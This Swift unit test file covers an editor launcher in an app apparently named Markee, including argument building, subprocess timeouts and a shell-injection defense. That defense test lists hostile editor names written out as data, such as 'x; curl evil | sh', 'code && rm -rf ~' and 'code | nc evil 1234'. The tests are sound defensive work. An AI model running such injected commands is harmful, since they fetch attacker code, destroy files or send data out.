import XCTest
@testable import Markee

final class EditorLauncherTests: XCTestCase {
    func test_buildArgs_vscodeFamily_usesDashG() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "code", file: "/x/y.md", line: 41),
            ["-g", "/x/y.md:42:1"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "cursor", file: "/x.md", line: 0),
            ["-g", "/x.md:1:1"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "code-insiders", file: "/x.md", line: nil),
            ["/x.md"]
        )
    }

    func test_buildArgs_zed_appendsColonLineColon1() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "zed", file: "/x.md", line: 9),
            ["/x.md:10:1"]
        )
    }

    func test_buildArgs_subl_appendsColonLine() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "subl", file: "/x.md", line: 4),
            ["/x.md:5"]
        )
    }

    /// Terminal editors would launch with no TTY: never auto-detected, and an
    /// override naming one is refused with an explanation.
    func test_terminalEditorsAreRefused() {
        for name in ["hx", "nvim", "vim"] {
            XCTAssertFalse(EditorLauncher.candidates.contains(name))
            XCTAssertNotNil(EditorLauncher.validationMessage(for: name))
        }
        XCTAssertNil(EditorLauncher.validationMessage(for: "code"))
        XCTAssertNil(EditorLauncher.validationMessage(for: ""))
        XCTAssertNotNil(EditorLauncher.validationMessage(for: "/usr/local/bin/code"))
    }

    func test_buildArgs_textmate_usesDashLBeforePath() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "mate", file: "/x.md", line: 99),
            ["-l", "100", "/x.md"]
        )
    }

    func test_buildArgs_vimFamily_usesPlusLine() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "mvim", file: "/x.md", line: 12),
            ["+13", "/x.md"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "gvim", file: "/x.md", line: nil),
            ["/x.md"]
        )
    }

    func test_buildArgs_unknownEditor_fallsBackToPathOnly() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "totally-made-up", file: "/x.md", line: 3),
            ["/x.md"]
        )
    }

    /// Negative / zero line shouldn't produce a `:0` jump — clamp to "no line".
    func test_buildArgs_nilLine_omitsLineSuffix() {
        let args = EditorLauncher.buildArgs(editor: "zed", file: "/x.md", line: nil)
        XCTAssertEqual(args, ["/x.md"])
    }

    // MARK: - Override-name validation (shell-injection defense)

    func test_isSafeEditorName_acceptsAllBuiltInCandidates() {
        for name in EditorLauncher.candidates {
            XCTAssertTrue(EditorLauncher.isSafeEditorName(name),
                          "Built-in candidate \(name) must pass safety check")
        }
    }

    func test_isSafeEditorName_rejectsShellMetacharacters() {
        let attacks = [
            "x; curl evil | sh",
            "code && rm -rf ~",
            "$(curl evil)",
            "`whoami`",
            "code | nc evil 1234",
            "code > /tmp/pwn",
            "code\nrm -rf ~",
            "x with spaces",
            "code\"injected",
            "code'injected",
            "../../../bin/bad",
            "code$IFS",
        ]
        for attack in attacks {
            XCTAssertFalse(EditorLauncher.isSafeEditorName(attack),
                           "Should reject shell-unsafe name: \(attack)")
        }
    }

    func test_resolveBinary_rejectsUnsafeName() {
        XCTAssertNil(EditorLauncher.resolveBinary("x; echo pwned"))
        XCTAssertNil(EditorLauncher.resolveBinary("$(uname)"))
    }

    // MARK: - runCapturing never hangs the caller

    func test_runCapturing_timesOutAndTerminates() {
        let start = Date()
        XCTAssertNil(EditorLauncher.runCapturing("/bin/sleep", ["5"], timeout: 0.3))
        XCTAssertLessThan(Date().timeIntervalSince(start), 2)
    }

    func test_runCapturing_drainsOutputLargerThanThePipeBuffer() {
        let out = EditorLauncher.runCapturing("/bin/sh", ["-c", "yes | head -c 200000"])
        XCTAssertEqual(out?.count, 200_000)
    }

    func test_runCapturing_stdinIsNullSoReadersSeeEOF() {
        XCTAssertEqual(EditorLauncher.runCapturing("/bin/cat", [], timeout: 2), "")
    }
}
